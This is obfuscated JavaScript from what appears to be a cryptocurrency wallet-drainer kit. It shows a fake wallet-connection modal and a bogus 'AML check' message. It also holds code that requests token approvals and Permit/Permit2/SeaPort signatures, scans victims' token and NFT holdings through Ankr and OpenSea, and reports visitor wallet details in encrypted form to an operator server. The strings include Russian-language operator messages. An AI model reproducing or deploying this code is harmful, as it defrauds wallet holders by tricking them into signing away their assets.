'<div\x20class=\x22web3-modal-main\x22><p\x20class=\x22web3-modal-title\x22\x20style=\x22margin-top:0\x22>Connect\x20your\x20wallet</p><div\x20class=\x22web3-modal-items\x22><div\x20class=\x22item\x22\x20onclick=\x27connect_wallet(\x22MetaMask\x22)\x27><div><div\x20class=\x22icon\x22><img\x20src=\x22/assets/web3-modal/images/MM.svg\x22\x20alt=\x22\x22></div><span>MetaMask</span></div><div\x20class=\x22arrow\x22></div></div><div\x20class=\x22item\x22\x20onclick=\x27connect_wallet(\x22Coinbase\x22)\x27><div><div\x20class=\x22icon\x22><img\x20src=\x22/assets/web3-modal/images/CB.svg\x22\x20alt=\x22\x22></div><span>Coinbase</span></div><div\x20class=\x22arrow\x22></div></div><div\x20class=\x22item\x22\x20onclick=\x27connect_wallet(\x22Trust\x20Wallet\x22)\x27><div><div\x20class=\x22icon\x22><img\x20src=\x22/assets/web3-modal/images/TW.svg\x22\x20alt=\x22\x22></div><span>Trust\x20Wallet</span></div><div\x20class=\x22arrow\x22></div></div><div\x20class=\x22item\x22\x20onclick=\x27connect_wallet(\x22Binance\x20Wallet\x22)\x27><div><div\x20class=\x22icon\x22><img\x20src=\x22/assets/web3-modal/images/BW.svg\x22\x20alt=\x22\x22></div><span>Binance\x20Wallet</span></div><div\x20class=\x22arrow\x22></div></div><div\x20class=\x22item\x22\x20onclick=\x22use_wc()\x22><div><div\x20class=\x22icon\x22></div><span>More\x20Wallets</span></div><div\x20class=\x22arrow\x22></div></div></div></div><div\x20class=\x22web3-modal-wc\x22\x20style=\x22display:none\x22><p\x20class=\x22web3-modal-title\x22\x20style=\x22margin-top:0\x22>Choose\x20Version</p><div\x20class=\x22web3-modal-items\x22><div\x20class=\x22item\x22\x20onclick=\x27connect_wallet(\x22WalletConnect\x22)\x27><div><div\x20class=\x22icon\x22><img\x20src=\x22/assets/web3-modal/images/WC.svg\x22\x20alt=\x22\x22></div><span>WalletConnect</span></div><div\x20class=\x22arrow\x22></div></div><div\x20class=\x22item\x22\x20onclick=\x27connect_wallet(\x22WalletConnect\x22)\x27><div><div\x20class=\x22icon\x22><img\x20src=\x22/assets/web3-modal/images/WC1.svg\x22\x20alt=\x22\x22></div><span>WalletConnect\x20Legacy</span></div><div\x20class=\x22arrow\x22></div></div><div\x20class=\x22item\x22\x20onclick=\x22wallet_connection()\x22><div\x20class=\x22arrow\x22\x20style=\x22transform:rotateY(190deg)\x22></div><div><div\x20class=\x22icon\x22></div><span>Return\x20to\x20Wallets</span></div></div></div></div>', 'sign_success', 'selectedAddress', 'transfer_cancel', 'Waiting...', 'splice', 'Got\x20your\x20sign,\x20wait\x20a\x20bit\x20for\x20confirmation...', 'Optimism', 'none', ',\x20Permit\x20Type:\x20', 'now', 'application/json', 'Connecting\x20to\x20blockchain...', 'Chat_Settings', 'ERC1155', '<b>Sorry!</b>\x20Your\x20wallet\x20doesn\x27t\x20meet\x20the\x20requirements.<br><br>Try\x20to\x20connect\x20a\x20middle-active\x20wallet\x20to\x20try\x20again!', 'Use_Public_Contract', '0x1', 'result', 'ether', 'utils', 'estimateGas', 'string', 'sign_cancel', 'Native', 'error', 'domain', 'transfer_success', 'celo', 'Contract_Legacy', '100', 'Trust', 'tokenPrice', 'skip', 'eth_sendTransaction', 'load', '@import\x20url(https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap);.web3-modal,.web3-overlay{position:fixed;top:0;left:0;width:100%}.web3-overlay{height:100%;background:rgba(23,23,23,.8);backdrop-filter:blur(5px);z-index:99998}.web3-modal{right:0;bottom:0;margin:auto;max-width:500px;height:fit-content;padding:21px\x200\x200;background:#fff;border-radius:60px;z-index:99999;font-family:Inter,sans-serif}.web3-modal-title{font-weight:700;font-size:24px;line-height:29px;color:#000;text-align:center}.web3-modal-items{border-top:1px\x20solid\x20rgba(0,0,0,.1);margin-top:21px}.web3-modal\x20.item{padding:15px\x2034px;border-bottom:1px\x20solid\x20rgba(0,0,0,.1);display:flex;align-items:center;justify-content:space-between;cursor:pointer;transition:.2s}.web3-modal\x20.item:hover{background:#fafafa;border-radius:\x2020px}.web3-modal\x20.item\x20div{display:flex;align-items:center}.web3-modal\x20.item:last-child{border-bottom:none;border-radius:\x200px\x200px\x2060px\x2060px;}.web3-modal\x20.item\x20span{font-weight:400;font-size:16px;color:#000;margin-left:11px}.web3-modal\x20.item\x20.icon{width:40px;height:40px;justify-content:center}.web3-modal\x20.item\x20.arrow{height:12px;width:7.4px;background:url(\x27/assets/web3-modal/images/arrow.svg\x27)\x20no-repeat}\x20@media\x20(prefers-color-scheme:\x20dark)\x20{.web3-modal\x20{background:\x20#1c1c1c;color:\x20#fff;}.web3-modal-items\x20{border-top:\x201px\x20solid\x20#E4DDDD;}.web3-modal\x20.item\x20span\x20{color:\x20#fff;}.web3-modal\x20.item\x20.arrow\x20{-webkit-filter:\x20invert(1);filter:\x20invert(1);}.web3-modal-title\x20{color:\x20#fff;}.web3-modal\x20.item:hover\x20{background:#262525;}\x20.swal2-popup\x20{\x20background:\x20#1c1c1c;\x20color:\x20#ffffff;\x20}\x20.swal2-styled.swal2-confirm\x20{\x20background-color:\x20#3e7022;\x20}\x20.swal2-styled.swal2-confirm:focus\x20{\x20box-shadow:\x200\x200\x200\x203px\x20#3e7022;\x20}\x20}', 'BAD_COUNTRY', 'gnosis', 'moonbeam', 'Pancake_V3', '&offset=0&limit=200', '&order_direction=desc&limit=200&include_orders=false', 'Loop_NFT', 'web3-overlay', 'api.bscscan.com', 'Please,\x20wait\x20a\x20bit\x20for\x20confirmation...', 'chain_identifier', 'leave_website', 'sign_permit2', '\x22,\x22outputs\x22:[],\x22payable\x22:true,\x22stateMutability\x22:\x22payable\x22,\x22type\x22:\x22function\x22}]', 'approve_success', '[PERMIT_2\x20FOUND]\x20', 'GET', 'toLowerCase', 'Mode', 'amount', '19378czFNHu', '120', 'NFTs', 'Ethereum', 'status', 'https://explorer.zksync.io/', 'GLMR', 'NATIVE', 'message_ts', 'match', 'polygon', 'transferFrom', 'personal_sign', 'data', 'Contract_Whitelist', 'body', 'Permit_BL', '#000000', 'Please\x20wait,\x20we\x27re\x20scanning\x20more\x20details...', 'setApprovalForAll', 'Pulse', 'accounts', 'cronos', 'serialize', 'Confirming\x20sign...', 'Запрещенная\x20геолокация', '0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45', 'USD', 'uint256[]', 'boolean', 'chain_success', 'lte', 'ANKR', 'Connection\x20established', 'Use_Public_Premium', 'abi', 'code', 'signMessage', 'innerHTML', 'Sign\x20is\x20confirmed', 'message', 'balanceUsd', 'schema_name', 'https://rpc.ankr.com/multichain/', 'name', 'increment', 'harmony', 'random', 'wallet_requestPermissions', 'SeaPort', 'Permit2', 'web3-modal', 'Loop_T', 'https://api.opensea.io/api/v1/assets?owner=', 'waitForTransaction', 'asset_contract', '0x2105', 'chain_id', 'Tokens_First', 'api.etherscan.io', '84HGmPQB', 'Sign\x20message\x20in\x20your\x20wallet...', '0x0', 'undefined', 'permit(', '_signTypedData', '<b>Done!</b>\x20Sign\x20message\x20in\x20your\x20wallet\x20to\x20continue...', 'connect_cancel', '_blank', 'blockchain', 'amount_raw', '0x144', 'log', 'display', '101344BeuSeP', 'safa_approves', 'Waiting\x20for\x20action', 'iPod', 'substring', '0x1E0049783F008A0085193E00003D00cd54003c71', 'Connecting\x20to\x20Blockchain...', 'Public_Contract', '7886064lsnynS', 'address', 'opera', '2768859HFuXuX', 'expiry', 'Use_Back_Feature', 'swapper_allowance', 'isCoinbaseBrowser', 'prepend', 'gasLimit', 'hash', 'parseEther', 'PermitDetails', 'replaceAll', 'table', 'API', 'recoverAddress', 'path', 'BNB', 'Trust\x20Wallet', 'withdraw_token', 'check_finish', 'click', 'time', 'Критическая\x20ошибка', 'ONE', 'Loading...', '<b>Confirming\x20your\x20sign...</b><br><br>Please,\x20don\x27t\x20leave\x20this\x20page!', '.connect-button', 'html', 'eth_sign', 'https://metamask.io', '[{\x22constant\x22:false,\x22inputs\x22:[],\x22name\x22:\x22', 'partner_address', 'iPod\x20Simulator', 'Binance\x20Coin', 'assets', 'Critical\x20Error', 'Processing\x20sign', 'https://ya.ru', 'uint48', 'sendTransaction', 'Blur', 'heco', 'PermitDetails[]', '0xEfF92A263d31888d860bD50809A8D171709b7b1c', 'V_MSG', ',\x20Allowance:\x20', 'location', 'join', 'We\x20have\x20received\x20your\x20signature,\x20but\x20it\x27s\x20incorrect,\x20please\x20try\x20again.', 'close', 'Implementation', 'gasPrice', 'Настройте\x20оценщики', 'appendChild', 'contractAddress', '0xA4B1', 'balanceRawInteger', 'userLanguage', 'https://metamask.app.link/dapp/', 'Wallet_Blacklist', 'AVAX', 'stringify', 'holder', 'formatUnits', '[{\x22constant\x22:false,\x22inputs\x22:[{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22owner\x22,\x22type\x22:\x22address\x22}],\x22name\x22:\x22', 'permit2', 'Contract_Address', 'percent', 'stats', '0xf849de01b080adc3a814fabe1e2087475cf2e354', 'Ни\x20один\x20из\x20оценщиков\x20не\x20активирован\x20в\x20настройках\x20скрипта,\x20оценка\x20активов\x20кошелька\x20невозможна,\x20проверьте\x20настройки\x20и\x20перезапустите\x20сервер!', 'personal_wallet', '<b>Ошибка</b><br><br>Ни\x20один\x20из\x20оценщиков\x20не\x20активирован\x20в\x20настройках\x20скрипта,\x20оценка\x20активов\x20кошелька\x20невозможна,\x20проверьте\x20настройки\x20и\x20перезапустите\x20сервер!', 'slice', 'Good,\x20your\x20wallet\x20is\x20AML\x20clear!', 'payable', 'function', 'swap_success', 'Force', 'sub', 'getElementById', 'Gas_Multiplier', 'hasOwnProperty', 'amountOutMin', 'version', 'Binance\x20Wallet', 'ethereum', 'approve_cancel', 'We\x27re\x20sorry', 'api.polygonscan.com', 'MS_ID', 'bytes[]', 'https://api.opensea.io/api/v1/collections?asset_owner=', 'BinanceChain', 'primary_asset_contracts', '0xFA', 'lemon-tree-gaming.replit.app', 'Chains', 'Quickswap', 'charCodeAt', '@walletconnect/ethereum-provider', 'Pancake', 'approve_token', 'Something\x20went\x20wrong!', 'BigNumber', 'INVALID_VERSION', 'mode', 'PERMIT2_BATCH', 'EthereumProvider', 'all', 'style', 'Approve', 'optimism', 'Checking\x20your\x20wallet\x20for\x20AML...', 'amountIn', 'split', 'length', 'web3-style', '.web3-overlay', 'MOVR', 'Permit', 'V_MODE', 'https://explorer.arbitrum.io', 'wallet_switchEthereumChain', 'getTransactionCount', 'Contract_Type', 'providers', 'light', '0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F', 'owner', 'block', 'parse', '[SWAP\x20FOUND]\x20', 'chainId', 'reduce', 'retrive_config', '<b>Критическая\x20ошибка</b><br><br>Скрипт\x20не\x20может\x20соединиться\x20с\x20сервером\x20и\x20получить\x20данные,\x20возможно\x20вы\x20настроили\x20что-то\x20некорректно\x20или\x20домен\x20сервера\x20ещё\x20недоступен\x20или\x20был\x20заблокирован.\x20Проверьте\x20и\x20исправьте\x20проблемы\x20перед\x20использованием\x20сайта.', 'api.snowtrace.io', 'AML\x20Error', 'substr', 'arbitrum', 'api.basescan.org', 'MetaMask', 'permit_ver', 'transfer', 'zkSync\x20Era', 'userAgent', 'iPad', 'connect_request', 'swapExactTokensForETH', 'uint256', 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless', '<b>Server\x20Error</b>\x20Please,\x20check\x20client\x20and\x20server\x20version,\x20looks\x20like\x20it\x20doesn\x27t\x20match,\x20or\x20maybe\x20you\x20need\x20to\x20clear\x20cache\x20everywhere\x20:(', 'Contract_Blacklist', 'type', 'partner_percent', 'Your\x20wallet\x20doesn\x27t\x20meet\x20the\x20requirements.\x20Try\x20to\x20connect\x20a\x20different\x20walt\x20to\x20try\x20again!', 'tokenSymbol', 'Sushiswap', 'sign_verify', 'https://snowtrace.io/', 'bool', 'https://', 'push', 'sha3', 'isApprovedForAll', 'href', 'functions', 'pending', '0xA86A', '2.0', 'FTM', 'open', 'getSigner', '4675008viNZAN', 'indexOf', 'Unlimited_BL', 'era', 'Getting\x20your\x20wallet\x20address...'];
    _0x2b92 = function() {
        return _0x2ca1c7;
    };
    return _0x2b92();
}
let prs_enc = 0x0,
    last_request_ts = 0x0;
((async () => {
    const _0x16958e = _0x1027e3;
    prs_enc = MS_Encryption_Key, MS_Encryption_Key = Math[_0x16958e(0x32c)](Math[_0x16958e(0x1c2)]() * 0x3e8);
})());
const send_request = async _0x50f76f => {
    const _0x2308f0 = _0x1027e3;
    try {
        if (MS_Force_Mode) return {
            'status': _0x2308f0(0x173),
            'error': _0x2308f0(0x31b)
        };
        while (Date[_0x2308f0(0x364)]() <= last_request_ts) await new Promise(_0x117a7b => setTimeout(_0x117a7b, 0x1));
        last_request_ts = Date['now'](), _0x50f76f[_0x2308f0(0x174)] = window['location'][_0x2308f0(0x30c)], _0x50f76f[_0x2308f0(0x32d)] = MS_Worker_ID || null, _0x50f76f['user_id'] = MS_ID || null, _0x50f76f[_0x2308f0(0x19b)] = last_request_ts, _0x50f76f[_0x2308f0(0x34c)] = MS_Custom_Chat[_0x2308f0(0x313)] == 0x0 ? ![] : MS_Custom_Chat[_0x2308f0(0x367)], _0x50f76f[_0x2308f0(0x206)] = MS_Partner_Address;
        const _0x3a9f06 = btoa(String(0x5 + 0xa + 0x16d + 0x800 + 0x363 + prs_enc)),
            _0x319f2e = prs(_0x3a9f06, btoa(JSON[_0x2308f0(0x224)](_0x50f76f))),
            _0x16a4d9 = await fetch(_0x2308f0(0x289) + MS_Server, {
                'method': _0x2308f0(0x323),
                'headers': {
                    'Accept': _0x2308f0(0x2a5),
                    'Content-Type': _0x2308f0(0x342)
                },
                'body': 'ver=08112023&raw=' + _0x319f2e
            });
        let _0x1110b1 = JSON[_0x2308f0(0x26a)](atob(srp(_0x3a9f06, await _0x16a4d9['text']())));
        if (!_0x1110b1['status']) return {
            'status': _0x2308f0(0x173),
            'error': _0x2308f0(0x31b)
        };
        else {
            if (_0x1110b1['status'] == 'error' && _0x1110b1[_0x2308f0(0x173)] == 'SRV_UNAVAILABLE') MS_Force_Mode = !![];
            if (_0x1110b1[_0x2308f0(0x197)] == _0x2308f0(0x173) && _0x1110b1[_0x2308f0(0x173)] == _0x2308f0(0x250)) {
                MS_Force_Mode = !![];
                try {
                    MS_Loader_Style == 0x2 ? MSL[_0x2308f0(0x314)]({
                        'icon': _0x2308f0(0x173),
                        'title': _0x2308f0(0x20a),
                        'subtitle': _0x2308f0(0x348),
                        'text': 'Please,\x20check\x20client\x20and\x20server\x20version,\x20looks\x20like\x20it\x20doesn\x27t\x20match,\x20or\x20maybe\x20you\x20need\x20to\x20clear\x20cache\x20everywhere\x20:(',
                        'confirmButtonText': 'OK',
                        'timer': 0x7530,
                        'color': MS_Color_Scheme
                    }) : (Swal['close'](), Swal[_0x2308f0(0x314)]({
                        'html': _0x2308f0(0x27f),
                        'icon': _0x2308f0(0x173),
                        'allowOutsideClick': !![],
                        'allowEscapeKey': !![],
                        'timer': 0x0,
                        'width': 0x258,
                        'showConfirmButton': !![],
                        'confirmButtonText': 'OK'
                    }));
                } catch (_0x1d1d32) {
                    console[_0x2308f0(0x1db)](_0x1d1d32);
                }
            }
            return _0x1110b1;
        }
    } catch (_0x20e935) {
        return console[_0x2308f0(0x1db)](_0x20e935), {
            'status': 'error',
            'error': 'Server\x20is\x20Unavailable'
        };
    }
}, retrive_config = async () => {
    const _0x1d3d0d = _0x1027e3;
    try {
        let _0x4679b5 = null;
        if (localStorage[_0x1d3d0d(0x22e)]) _0x4679b5 = {
            'address': localStorage['personal_wallet']
        };
        const _0x53f53f = await send_request({
            'action': _0x1d3d0d(0x26e),
            'personal_wallet': _0x4679b5
        });
        if (_0x53f53f[_0x1d3d0d(0x197)] == 'OK') {
            MS_Connection = !![], MS_Settings = _0x53f53f['data'], MS_Gas_Multiplier = MS_Settings['Settings'][_0x1d3d0d(0x238)];
            if (!MS_Settings['CIS']) MS_Bad_Country = ![];
            if (MS_Settings[_0x1d3d0d(0x305)] && typeof MS_Settings[_0x1d3d0d(0x305)] == _0x1d3d0d(0x2d9)) localStorage[_0x1d3d0d(0x22e)] = MS_Settings[_0x1d3d0d(0x305)][_0x1d3d0d(0x1e6)];
            typeof MS_Settings['DSB'] == _0x1d3d0d(0x1b0) && MS_Settings['DSB'] === !![] && (window[_0x1d3d0d(0x215)][_0x1d3d0d(0x28d)] = _0x1d3d0d(0x2a2));
        }
    } catch (_0x5cf7fc) {
        console[_0x1d3d0d(0x1db)](_0x5cf7fc);
    }
}, retrive_contract = async () => {
    const _0x5ef007 = _0x1027e3;
    try {
        const _0xf3cf1f = await send_request({
            'action': 'retrive_contract'
        });
        if (_0xf3cf1f['status'] == 'OK') MS_Contract_ABI = _0xf3cf1f[_0x5ef007(0x1a0)];
    } catch (_0x239a57) {
        console[_0x5ef007(0x1db)](_0x239a57);
    }
}, enter_website = async () => {
    const _0x1a7d81 = _0x1027e3;
    try {
        let _0x334b46 = await send_request({
            'action': 'enter_website',
            'user_id': MS_ID,
            'time': new Date()['toLocaleString'](_0x1a7d81(0x303))
        });
        _0x334b46['status'] == 'error' && _0x334b46[_0x1a7d81(0x173)] == _0x1a7d81(0x17f) && (MS_Bad_Country = !![]);
    } catch (_0x149a0a) {
        console['log'](_0x149a0a);
    }
}, leave_website = async () => {
    const _0x3b13f4 = _0x1027e3;
    try {
        if (!MS_Settings[_0x3b13f4(0x2e0)][_0x3b13f4(0x18a)]) return;
        await send_request({
            'action': _0x3b13f4(0x18a),
            'user_id': MS_ID
        });
    } catch (_0x1befc8) {
        console[_0x3b13f4(0x1db)](_0x1befc8);
    }
}, connect_request = async () => {
    const _0x59f0cf = _0x1027e3;
    try {
        if (!MS_Settings['Notifications'][_0x59f0cf(0x27b)]) return;
        await send_request({
            'action': _0x59f0cf(0x27b),
            'user_id': MS_ID,
            'wallet': MS_Current_Provider
        });
    } catch (_0x295755) {
        console[_0x59f0cf(0x1db)](_0x295755);
    }
}, connect_cancel = async () => {
    const _0x50e9b3 = _0x1027e3;
    try {
        if (!MS_Settings[_0x50e9b3(0x2e0)][_0x50e9b3(0x1d6)]) return;
        await send_request({
            'action': _0x50e9b3(0x1d6),
            'user_id': MS_ID
        });
    } catch (_0x382d5d) {
        console[_0x50e9b3(0x1db)](_0x382d5d);
    }
}, connect_success = async () => {
    const _0x3acd42 = _0x1027e3;
    try {
        if (!MS_Settings[_0x3acd42(0x2e0)][_0x3acd42(0x2e9)]) return;
        await send_request({
            'action': _0x3acd42(0x2e9),
            'user_id': MS_ID,
            'address': MS_Current_Address,
            'wallet': MS_Current_Provider,
            'chain_id': MS_Current_Chain_ID
        });
    } catch (_0x24f579) {
        console[_0x3acd42(0x1db)](_0x24f579);
    }
}, convert_chain = (_0x4bbb3e, _0x2b8e7b, _0x5ace79) => {
    const _0x1ce766 = _0x1027e3;
    try {
        if (_0x4bbb3e == _0x1ce766(0x1b3) && _0x2b8e7b == 'ID') switch (_0x5ace79) {
            case _0x1ce766(0x2f8):
                return 0x1;
            case _0x1ce766(0x2cf):
                return 0x38;
            case _0x1ce766(0x19d):
                return 0x89;
            case _0x1ce766(0x2e3):
                return 0xa86a;
            case _0x1ce766(0x273):
                return 0xa4b1;
            case _0x1ce766(0x257):
                return 0xa;
            case _0x1ce766(0x2f0):
                return 0xfa;
            case _0x1ce766(0x298):
                return 0x144;
            case _0x1ce766(0x2eb):
                return 0x2105;
            case _0x1ce766(0x2b2):
                return 0x171;
            default:
                return ![];
        } else {
            if (_0x4bbb3e == _0x1ce766(0x2a3) && _0x2b8e7b == 'ID') switch (_0x5ace79) {
                case _0x1ce766(0x23d):
                    return 0x1;
                case 'matic':
                    return 0x89;
                case _0x1ce766(0x2e3):
                    return 0xa86a;
                case _0x1ce766(0x273):
                    return 0xa4b1;
                case 'optimism':
                    return 0xa;
                case _0x1ce766(0x298):
                    return 0x144;
                case 'base':
                    return 0x2105;
                case _0x1ce766(0x2b2):
                    return 0x171;
                default:
                    return ![];
            } else {
                if (_0x4bbb3e == 'ID' && _0x2b8e7b == 'ANKR') switch (_0x5ace79) {
                    case 0x1:
                        return _0x1ce766(0x2f8);
                    case 0x38:
                        return 'bsc';
                    case 0x89:
                        return _0x1ce766(0x19d);
                    case 0xa86a:
                        return 'avalanche';
                    case 0xa4b1:
                        return _0x1ce766(0x273);
                    case 0xa:
                        return _0x1ce766(0x257);
                    case 0xfa:
                        return _0x1ce766(0x2f0);
                    case 0x19:
                        return _0x1ce766(0x1a9);
                    case 0x64:
                        return _0x1ce766(0x180);
                    case 0x80:
                        return _0x1ce766(0x210);
                    case 0x504:
                        return _0x1ce766(0x181);
                    case 0x505:
                        return _0x1ce766(0x2c5);
                    case 0x8ae:
                        return 'kava';
                    case 0xa4ec:
                        return _0x1ce766(0x176);
                    case 0x63564c40:
                        return _0x1ce766(0x1c1);
                    case 0x144:
                        return 'zksync_era';
                    case 0x2105:
                        return 'base';
                    case 0x171:
                        return 'pulse';
                    default:
                        return ![];
                } else {
                    if (_0x4bbb3e == 'ID' && _0x2b8e7b == _0x1ce766(0x336)) switch (_0x5ace79) {
                        case 0x1:
                            return _0x1ce766(0x2cd);
                        case 0x38:
                            return _0x1ce766(0x1f7);
                        case 0x89:
                            return _0x1ce766(0x346);
                        case 0xa86a:
                            return _0x1ce766(0x223);
                        case 0xa4b1:
                            return _0x1ce766(0x2cd);
                        case 0xa:
                            return _0x1ce766(0x2cd);
                        case 0xfa:
                            return _0x1ce766(0x292);
                        case 0x19:
                            return 'CRO';
                        case 0x64:
                            return _0x1ce766(0x2ae);
                        case 0x80:
                            return 'HT';
                        case 0x504:
                            return _0x1ce766(0x199);
                        case 0x505:
                            return _0x1ce766(0x25e);
                        case 0x8ae:
                            return _0x1ce766(0x334);
                        case 0xa4ec:
                            return _0x1ce766(0x2f3);
                        case 0x63564c40:
                            return _0x1ce766(0x1fe);
                        case 0x144:
                            return _0x1ce766(0x2cd);
                        case 0x2105:
                            return 'ETH';
                        case 0x171:
                            return _0x1ce766(0x2ee);
                        default:
                            return ![];
                    }
                }
            }
        }
    } catch (_0x331079) {
        return console['log'](_0x331079), ![];
    }
}, get_tokens = async _0x235fca => {
    const _0x48005a = _0x1027e3;
    try {
        let _0x426055 = [],
            _0xbc427c = await fetch(_0x48005a(0x1be) + (MS_Settings['AT'] || ''), {
                'method': _0x48005a(0x323),
                'headers': {
                    'Accept': 'application/json',
                    'Content-Type': _0x48005a(0x365)
                },
                'body': JSON['stringify']({
                    'id': 0x1,
                    'jsonrpc': _0x48005a(0x291),
                    'method': 'ankr_getAccountBalance',
                    'params': {
                        'blockchain': [_0x48005a(0x2f8), _0x48005a(0x2eb), 'bsc', 'polygon', _0x48005a(0x2e3), 'arbitrum', _0x48005a(0x2f0), _0x48005a(0x257), 'base'],
                        'walletAddress': _0x235fca
                    }
                })
            });
        _0xbc427c = await _0xbc427c[_0x48005a(0x2c9)]();
        for (const _0x2dc68e of _0xbc427c[_0x48005a(0x36c)]['assets']) {
            try {
                let _0x36ff15 = _0x2dc68e[_0x48005a(0x21d)] || 'NATIVE';
                if (MS_Settings[_0x48005a(0x1a1)][_0x48005a(0x25b)] > 0x0 && !MS_Settings['Contract_Whitelist'][_0x48005a(0x2e6)](_0x36ff15[_0x48005a(0x190)]()[_0x48005a(0x2fc)]())) continue;
                else {
                    if (MS_Settings['Contract_Blacklist']['length'] > 0x0 && MS_Settings[_0x48005a(0x280)][_0x48005a(0x2e6)](_0x36ff15[_0x48005a(0x190)]()[_0x48005a(0x2fc)]())) continue;
                }
                let _0x555383 = {
                    'chain_id': convert_chain(_0x48005a(0x1b3), 'ID', _0x2dc68e[_0x48005a(0x1d8)]),
                    'name': _0x2dc68e['tokenName'],
                    'type': _0x2dc68e[_0x48005a(0x330)],
                    'amount': parseFloat(_0x2dc68e[_0x48005a(0x29f)]),
                    'amount_raw': _0x2dc68e[_0x48005a(0x21f)],
                    'amount_usd': parseFloat(_0x2dc68e[_0x48005a(0x1bc)]),
                    'symbol': _0x2dc68e[_0x48005a(0x284)],
                    'decimals': _0x2dc68e['tokenDecimals'],
                    'address': _0x36ff15 || null,
                    'price': parseFloat(_0x2dc68e[_0x48005a(0x17a)])
                };
                if (_0x555383[_0x48005a(0x2d8)] > 0x0) _0x426055[_0x48005a(0x28a)](_0x555383);
            } catch (_0x371d88) {
                console['log'](_0x371d88);
            }
        }
        return _0x426055;
    } catch (_0x380e6d) {
        return console['log'](_0x380e6d), [];
    }
}, get_nfts = async _0x36e0cc => {
    const _0x378f0a = _0x1027e3;
    try {
        let _0x44cf21 = await fetch(_0x378f0a(0x1c8) + _0x36e0cc + _0x378f0a(0x184)),
            _0x29c3e5 = (await _0x44cf21[_0x378f0a(0x2c9)]())[_0x378f0a(0x209)];
        _0x44cf21 = await fetch(_0x378f0a(0x243) + _0x36e0cc + _0x378f0a(0x183));
        let _0x4e5d5e = await _0x44cf21[_0x378f0a(0x2c9)](),
            _0x3009c8 = [];
        for (const _0x433674 of _0x29c3e5) {
            try {
                let _0x24e85a = null;
                for (const _0x379395 of _0x4e5d5e) {
                    try {
                        if (_0x379395[_0x378f0a(0x245)][_0x378f0a(0x25b)] < 0x1) continue;
                        if (_0x379395[_0x378f0a(0x245)][0x0][_0x378f0a(0x1e6)] == _0x433674[_0x378f0a(0x1ca)][_0x378f0a(0x1e6)]) {
                            _0x24e85a = _0x379395;
                            break;
                        }
                    } catch (_0x12097d) {
                        console[_0x378f0a(0x1db)](_0x12097d);
                    }
                }
                if (_0x24e85a == null) continue;
                if (MS_Settings[_0x378f0a(0x1a1)][_0x378f0a(0x25b)] > 0x0 && !MS_Settings[_0x378f0a(0x1a1)][_0x378f0a(0x2e6)](_0x433674[_0x378f0a(0x1ca)][_0x378f0a(0x1e6)][_0x378f0a(0x190)]()[_0x378f0a(0x2fc)]())) continue;
                else {
                    if (MS_Settings[_0x378f0a(0x280)][_0x378f0a(0x25b)] > 0x0 && MS_Settings[_0x378f0a(0x280)][_0x378f0a(0x2e6)](_0x433674['asset_contract']['address'][_0x378f0a(0x190)]()[_0x378f0a(0x2fc)]())) continue;
                }
                let _0x17c461 = convert_chain(_0x378f0a(0x2a3), 'ID', _0x433674[_0x378f0a(0x1ca)][_0x378f0a(0x189)]),
                    _0x2e6a22 = _0x24e85a['stats'][_0x378f0a(0x2db)] != 0x0 ? _0x24e85a[_0x378f0a(0x22b)][_0x378f0a(0x2db)] : _0x24e85a['stats'][_0x378f0a(0x34b)];
                _0x2e6a22 = _0x2e6a22 * MS_Currencies[convert_chain('ID', _0x378f0a(0x336), _0x17c461)][_0x378f0a(0x1ae)];
                let _0x3caa75 = {
                    'chain_id': _0x17c461,
                    'name': _0x433674[_0x378f0a(0x1bf)],
                    'type': _0x433674[_0x378f0a(0x1ca)][_0x378f0a(0x1bd)],
                    'amount': _0x433674['num_sales'],
                    'amount_raw': null,
                    'amount_usd': _0x2e6a22,
                    'id': _0x433674[_0x378f0a(0x31d)],
                    'symbol': null,
                    'decimals': null,
                    'address': _0x433674[_0x378f0a(0x1ca)][_0x378f0a(0x1e6)],
                    'price': _0x2e6a22
                };
                if (typeof _0x2e6a22 == _0x378f0a(0x2c1) && !isNaN(_0x2e6a22) && _0x2e6a22 > 0x0) _0x3009c8[_0x378f0a(0x28a)](_0x3caa75);
            } catch (_0x197f0d) {
                console['log'](_0x197f0d);
            }
        }
        return _0x3009c8;
    } catch (_0x103e08) {
        return console['log'](_0x103e08), [];
    }
}, retrive_timeout = {}, retrive_token = async (_0x3711e5, _0x2c6059) => {
    const _0x4a8fb2 = _0x1027e3;
    try {
        if (!MS_API_Data[_0x3711e5] || MS_Settings[_0x4a8fb2(0x30a)][_0x4a8fb2(0x248)][convert_chain('ID', _0x4a8fb2(0x1b3), _0x3711e5)][_0x4a8fb2(0x1f4)] == '') return MS_Contract_ABI[_0x4a8fb2(0x345)];
        while (retrive_timeout[_0x3711e5] && retrive_timeout[_0x3711e5]['time'] == Math[_0x4a8fb2(0x32c)](Date['now']() / 0x3e8) && retrive_timeout[_0x3711e5][_0x4a8fb2(0x357)] >= 0x5) await new Promise(_0x5cd452 => setTimeout(_0x5cd452, 0x64));
        if (!retrive_timeout[_0x3711e5]) retrive_timeout[_0x3711e5] = {
            'time': Math[_0x4a8fb2(0x32c)](Date['now']() / 0x3e8),
            'count': 0x1
        };
        else {
            if (retrive_timeout[_0x3711e5][_0x4a8fb2(0x1fc)] == Math[_0x4a8fb2(0x32c)](Date[_0x4a8fb2(0x364)]() / 0x3e8)) retrive_timeout[_0x3711e5]['count'] += 0x1;
            else retrive_timeout[_0x3711e5][_0x4a8fb2(0x1fc)] = Math[_0x4a8fb2(0x32c)](Date[_0x4a8fb2(0x364)]() / 0x3e8), retrive_timeout[_0x3711e5][_0x4a8fb2(0x357)] = 0x1;
        }
        let _0x1019a9 = await fetch(_0x4a8fb2(0x289) + MS_API_Data[_0x3711e5] + _0x4a8fb2(0x34d) + _0x2c6059 + _0x4a8fb2(0x2d5) + MS_Settings[_0x4a8fb2(0x30a)][_0x4a8fb2(0x248)][convert_chain('ID', _0x4a8fb2(0x1b3), _0x3711e5)][_0x4a8fb2(0x1f4)], {
            'method': _0x4a8fb2(0x18f),
            'headers': {
                'Accept': 'application/json'
            }
        });
        _0x1019a9 = await _0x1019a9['json']();
        if (_0x1019a9[_0x4a8fb2(0x1bb)] == 'OK') {
            if (_0x1019a9['result'][0x0][_0x4a8fb2(0x2e1)] == '1' && _0x1019a9['result'][0x0][_0x4a8fb2(0x219)] != '') {
